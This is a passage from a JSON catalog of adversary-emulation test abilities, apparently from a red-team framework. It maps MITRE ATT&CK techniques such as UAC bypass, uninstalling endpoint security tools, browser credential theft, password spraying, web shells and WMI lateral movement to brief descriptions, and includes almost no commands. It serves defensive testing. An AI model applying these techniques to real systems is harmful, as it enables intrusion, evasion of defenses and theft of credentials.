        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "UACME Bypass Method 61",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "0bba96f96380dbc1fe2f3f4db148b8c0",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Simulates an adversary copying malware to all connected removable drives. \n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Replication Through Removable Media",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "USB Malware Spread Simulation",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "95f9e48ea1fbdac2f1c7c656b655ae4c",
        "technique_id": "T1091",
        "repeatable": false
    },
    {
        "description": "An adversary may attempt to trick the user into downloading UltraVNC for use as a C2 channel.\nUpon successful execution, UltraVNC will be executed.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Access Software",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "UltraVNC Execution",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "13286011c4ad0d577bccb6a85a13982a",
        "technique_id": "T1219",
        "repeatable": false
    },
    {
        "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as UltraViewer to provide the operator with access to the network using legitimate services. \n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Access Software",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "UltraViewer - RAT Execution",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "10b46b4b36e03efea62ea69331623358",
        "technique_id": "T1219",
        "repeatable": false
    },
    {
        "description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Uninstall Crowdstrike Falcon on Windows",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2e9acde621e7768a73c1b9a1157c444d",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Uninstall Sysinternals Sysmon for Defense Evasion\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Uninstall Sysmon",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0dd0e92f8334f31545e8545065a059da",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Unload Sysmon Filter Driver",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b0994d3924347a714de2bbfb269f3fbd",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Ursnif downloads additional modules from the C&C server and saves these in the registry folder HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\\nMore information - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Ursnif Malware Registry Key Creation",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "9e45dba442d5aa5c977f2086a09c2d0c",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments\nWill start a process on a remote host.\n\nUpon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Services: Service Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Use PsExec to execute a command on a remote host",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "50d199543d7813b877e299ac48c908ba",
        "technique_id": "T1569.002",
        "repeatable": false
    },
    {
        "description": "Requires having RemCom installed, path to RemCom is one of the input input_arguments\nWill start a process on a remote host.\nUpon successful execution, cmd will utilize RemCom.exe to spawn calc.exe on a remote endpoint (default:localhost).\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Services: Service Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Use RemCom to execute a command on a remote host",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "753ad1ad41cf59a2d3a7e2972c0d16c4",
        "technique_id": "T1569.002",
        "repeatable": false
    },
    {
        "description": "SecEdit.exe can be used to export the current local security policy applied to a host.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Password Policy Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Use of SecEdit.exe to export the local security policy (including the password policy)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "ebc55b8de493510344b6a0e6d34387a3",
        "technique_id": "T1201",
        "repeatable": false
    },
    {
        "description": "Use the PowerShell environment variables to identify the current logged user.",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "User Discovery With Env Vars PowerShell Script",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "2bf75f949823305d3ea815c8e94e9ee3",
        "technique_id": "T1033",
        "repeatable": false
    },
    {
        "description": "Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hijack Execution Flow: COR_PROFILER",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "User scope COR_PROFILER",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "47782bfea04a05a4b7b1c4b59279b4fb",
        "technique_id": "T1574.012",
        "repeatable": false
    },
    {
        "description": "Add data to clipboard to copy off or execute commands from.\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Clipboard Data",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Utilize Clipboard to store or execute commands from",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "70795de7cbb842edb029b3378c27c008",
        "technique_id": "T1115",
        "repeatable": false
    },
    {
        "description": "Display information about current system processes",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ps",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "View Processes",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "335cea7b-bec0-48c6-adfb-6066070f5f68",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "Network Share Discovery",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Share Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "View admin shares",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "530e47c6-8592-42bf-91df-c59ffbd8541b",
        "technique_id": "T1135",
        "repeatable": false
    },
    {
        "description": "View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Share Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "View available share drives",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "f247309a5f934b32f2e510eb50409d3b",
        "technique_id": "T1135",
        "repeatable": false
    },
    {
        "description": "View the shares of a remote host",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Share Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "View remote shares",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "deeac480-5c2a-42b5-90bb-41675ee53c7e",
        "technique_id": "T1135",
        "repeatable": false
    },
    {
        "description": "Determine if the system is virtualized or physical",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Virtualization/Sandbox Evasion: System Checks",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Virtual or Real",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "5dc841fd-28ad-40e2-b10e-fb007fe09e81",
        "technique_id": "T1497.001",
        "repeatable": false
    },
    {
        "description": "Visual Basic execution test, execute vbscript via PowerShell.\n\nWhen successful, system information will be written to $env:TEMP\\T1059.005.out.txt.",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Visual Basic",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Visual Basic script execution to gather local computer information",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "8dffc63a433a6abb131ae70845e66126",
        "technique_id": "T1059.005",
        "repeatable": false
    },
    {
        "description": "Open a .docx file that loads a remote .dotm macro enabled template from https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm \nExecutes the code specified within the .dotm template.\nRequires download of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  \nDefault docs file opens Calculator.exe when test sucessfully executed, while AV turned off.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Template Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WINWORD Remote Template Injection",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "081fccc31e55ea72b25e9914f15921b0",
        "technique_id": "T1221",
        "repeatable": false
    },
    {
        "description": "This test uses wmic.exe to execute a process on the local host.\nWhen the test completes , a new process will be started locally .A notepad application will be started when input is left on default.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Windows Management Instrumentation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMI Execute Local Process",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "9712e4aabe914d8a978ceb8c787f93a7",
        "technique_id": "T1047",
        "repeatable": false
    },
    {
        "description": "This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.\nTo clean up, provide the same node input as the one provided to run the test\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" if the default or provided IP is unreachable\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Windows Management Instrumentation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMI Execute Remote Process",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "fd43e89c476ae8a53cdc25143977e070",
        "technique_id": "T1047",
        "repeatable": false
    },
    {
        "description": "This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Windows Management Instrumentation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMI Execute rundll32",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "52bcd9532d677ff09b834956a0b3ea75",
        "technique_id": "T1047",
        "repeatable": false
    },
    {
        "description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMI Invoke-CimMethod Scheduled Task",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "5bfd20d7a230f8472d78362fd2b9416f",
        "technique_id": "T1053.005",
        "repeatable": false
    },
    {
        "description": "The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.\nThis is a novel way to perform lateral movement or to start a remote process.\nThis does require WinRM to be enabled. The account performing the run will also need to be elevated.\nA successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMI Invoke-CimMethod Start Process",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "6fb0cdea444d58a340896d606baf281a",
        "technique_id": "T1546",
        "repeatable": false
    },
    {
        "description": "An adversary might use WMI to check if a certain Remote Service is running on a remote device. \nWhen the test completes, a service information will be displayed on the screen if it exists.\nA common feedback message is that \"No instance(s) Available\" if the service queried is not running.\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" \nif the provided remote host is unreacheable\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Windows Management Instrumentation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMI Reconnaissance List Remote Services",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "e9d6ab093c65f521e9d900b9dc9eca28",
        "technique_id": "T1047",
        "repeatable": false
    },
    {
        "description": "An adversary might use WMI to list Processes running on the compromised host.\nWhen the test completes , there should be running processes listed on the command line.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Windows Management Instrumentation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMI Reconnaissance Processes",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "ac2764f7a67a9ce92b54e8e59b361838",
        "technique_id": "T1047",
        "repeatable": false
    },
    {
        "description": "An adversary might use WMI to list installed Software hotfix and patches.\nWhen the test completes, there should be a list of installed patches and when they were installed.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Windows Management Instrumentation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMI Reconnaissance Software",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "ed736a123da6fb2aab22cfd4f437e8b5",
        "technique_id": "T1047",
        "repeatable": false
    },
    {
        "description": "An adversary might use WMI to list all local User Accounts. \nWhen the test completes , there should be local user accounts information displayed on the command line.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Windows Management Instrumentation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMI Reconnaissance Users",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "b0255b5120cbabc062d8d4510a142c3b",
        "technique_id": "T1047",
        "repeatable": false
    },
    {
        "description": "Executes an MSI containing an embedded DLL using the WMI Win32_Product class\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Msiexec",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMI Win32_Product Class - Execute Local MSI file with an embedded DLL",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "3e29fb41fe9d7dd07fbe9adadee8b1da",
        "technique_id": "T1218.007",
        "repeatable": false
    },
    {
        "description": "Executes an MSI containing an embedded EXE using the WMI Win32_Product class\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Msiexec",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMI Win32_Product Class - Execute Local MSI file with an embedded EXE",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f01d06af8bd1a70684c2bbb341f90eb3",
        "technique_id": "T1218.007",
        "repeatable": false
    },
    {
        "description": "Executes an MSI containing embedded JScript code using the WMI Win32_Product class\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Msiexec",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMI Win32_Product Class - Execute Local MSI file with embedded JScript",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2a971043ed3c06eac6b8cf496f706b46",
        "technique_id": "T1218.007",
        "repeatable": false
    },
    {
        "description": "Executes an MSI containing embedded VBScript code using the WMI Win32_Product class\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Msiexec",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMI Win32_Product Class - Execute Local MSI file with embedded VBScript",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f7144396fff68187217107bf2bc39600",
        "technique_id": "T1218.007",
        "repeatable": false
    },
    {
        "description": "Capture process id, executable path, pid and parent pid before writing to disk",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "WMIC",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMIC Process Enumeration",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "94f21386-9547-43c4-99df-938ab05d45ce",
        "technique_id": "T1047",
        "repeatable": false
    },
    {
        "description": "The following Atomic will attempt to exclude a folder within Defender leveraging WMI\nReference: https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMIC Tamper with Windows Defender Evade Scanning Folder",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "58e980270c575e1e3b3c782976efa93d",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Executes the code specified within a XSL script using a local payload.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "XSL Script Processing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMIC bypass using local XSL file",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c71ae2939195beabaf5fe020c958978d",
        "technique_id": "T1220",
        "repeatable": false
    },
    {
        "description": "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "XSL Script Processing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMIC bypass using remote XSL file",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f241bda59261f9930621f38d5ed42abf",
        "technique_id": "T1220",
        "repeatable": false
    },
    {
        "description": "Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Local Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WMIObject Group Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "e541c2b62c3259680863a6f3b410e59a",
        "technique_id": "T1069.001",
        "repeatable": false
    },
    {
        "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Server Software Component: Web Shell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Web Shell Written to Disk",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "300ce4eae0a89518065bb58178c8703f",
        "technique_id": "T1505.003",
        "repeatable": false
    },
    {
        "description": "The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WebBrowserPassView - Credentials from Browser",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "08c8ac512b422e66e7ec398f60f02645",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "This test discovers users who have authenticated against a Domain Controller via NTLM. \nThis is done remotely via wmic and captures the event code 4776 from the domain controller and stores the ouput in C:\\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Wevtutil - Discover NTLM Users Remote",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "ffe23675b3b68eb6d2b6e771451de3af",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Peripheral Device Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Win32_PnPEntity Hardware Inventory",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "7b9c7afaefa59aab759b49af0d699ac1",
        "technique_id": "T1120",
        "repeatable": false
    },
    {
        "description": "Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - BrowserPwn",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "954860df5054a5fabc114abefd8e45f6",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "DomainPasswordSpray Attacks technique via function of WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Brute Force: Password Spraying",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - DomainPasswordSpray Attacks",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "7532005da662bfc703ce3d8ef4e8ac70",
        "technique_id": "T1110.003",
        "repeatable": false
    },
    {
        "description": "Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - DotNet",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "0954576f69ca8e140f2cdc9e58b36ff9",
        "technique_id": "T1518",
        "repeatable": false
    },
    {
        "description": "Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Dotnetsearch",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "beafe61e6874eb9eec2119bd12255193",
        "technique_id": "T1518",
        "repeatable": false
    },
    {
        "description": "Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Group Policy Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - GPOAudit",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "a3c8fba61f02a7b96306b87121b2ac4b",
        "technique_id": "T1615",
        "repeatable": false
    },
    {
        "description": "Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Group Policy Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - GPORemoteAccessPolicy",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "834e861bba95b87d066e84c5c6b056a0",
        "technique_id": "T1615",
        "repeatable": false
    },
    {
        "description": "General privesc checks using the otherchecks function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - General privesc checks",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "c58ba91431b9d73d726ccdd7d030a694",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Collect general computer informations via GeneralRecon function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - GeneralRecon",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "b7e7e9eb804006a78cdd75940f7b7c3e",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Native API",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "2ca71106ee0aff2eda551bb6ed2b39e4",
        "technique_id": "T1106",
        "repeatable": false
    },
    {
        "description": "Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Injection: Dynamic-link Library Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique",
        "tactic": "multiple",
        "plugin": "atomic",
